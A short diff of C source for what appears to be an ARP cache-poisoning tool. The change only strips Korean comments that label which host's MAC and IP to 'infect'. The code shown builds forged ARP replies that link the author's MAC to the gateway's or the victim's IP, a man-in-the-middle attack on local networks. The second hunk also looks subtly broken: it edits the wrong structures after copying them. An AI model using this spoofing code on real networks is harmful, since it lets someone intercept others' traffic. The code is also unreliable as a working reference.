@@ -105,15 +105,15 @@ int main()
 
     eth_hdr eth_s;
     eth_s = eth;
-    memcpy(eth_s.eth_dmac, sender_mac, sizeof(sender_mac));//감염시킬 sender의 mac
+    memcpy(eth_s.eth_dmac, sender_mac, sizeof(sender_mac));
     memcpy(eth_s.eth_smac, my_mac, sizeof(my_mac));
     arp_req arp_s;
     arp_s = arp;
     arp_s.arp_opr = htons(ARPOP_REPLY);
     memcpy(arp_s.arp_shwaddr, my_mac, sizeof(my_mac));
-    memcpy(arp_s.arp_sipaddr, receiver_ip, sizeof(receiver_ip));//gateway의 ip
-    memcpy(arp_s.arp_thwaddr, sender_mac, sizeof(sender_mac));//감염시킬 sender의 mac
-    memcpy(arp_s.arp_tproaddr, sender_ip, sizeof(sender_ip));//감염시킬 sender의 ip
+    memcpy(arp_s.arp_sipaddr, receiver_ip, sizeof(receiver_ip));
+    memcpy(arp_s.arp_thwaddr, sender_mac, sizeof(sender_mac));
+    memcpy(arp_s.arp_tproaddr, sender_ip, sizeof(sender_ip));
     eth_arp_req infect_s;
     infect_s.eth = eth_s;
     infect_s.arp = arp_s;
@@ -123,9 +123,9 @@ int main()
     memcpy(eth_s.eth_dmac, receiver_mac, sizeof(receiver_mac));
     arp_req arp_r;
     arp_r = arp_s;
-    memcpy(arp_s.arp_sipaddr, sender_ip, sizeof(sender_ip));//gateway의 ip
-    memcpy(arp_s.arp_thwaddr, receiver_mac, sizeof(receiver_mac));//감염시킬 sender의 mac
-    memcpy(arp_s.arp_tproaddr, receiver_ip, sizeof(receiver_ip));//감염시킬 sender의 ip
+    memcpy(arp_s.arp_sipaddr, sender_ip, sizeof(sender_ip));
+    memcpy(arp_s.arp_thwaddr, receiver_mac, sizeof(receiver_mac));
+    memcpy(arp_s.arp_tproaddr, receiver_ip, sizeof(receiver_ip));
     eth_arp_req infect_r;
     infect_r.eth = eth_r;
     infect_r.arp = arp_r;
